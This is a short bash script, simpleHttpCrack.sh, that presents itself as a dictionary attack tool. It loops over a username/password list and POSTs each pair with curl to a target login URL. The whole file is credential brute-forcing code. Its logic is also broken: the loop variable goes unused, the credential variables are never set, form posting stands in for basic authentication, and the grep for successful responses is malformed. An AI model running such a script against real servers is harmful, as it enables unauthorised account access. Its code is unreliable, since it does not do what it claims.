#!/usr/bin/env bash
#######################################################
# Name:           simpleHttpCrack.sh
# Date:           01/27/2016
# Author(s):      FOXX (frozenfoxx@github.com), bperry
# Description:    simple script to run a dictionary
#   attack against basic authentication HTTPD servers.
# Requirements:
#   - curl
#   - password list
#   - target URL (of the form "http://hit.me/login")
#######################################################

# Variables
TARGET=$1

# Logic
for i in `cat user_pass_list.txt`; do
  curl -X POST --data "username=$username&password=$password" ${TARGET}
done | grep HTTP 200
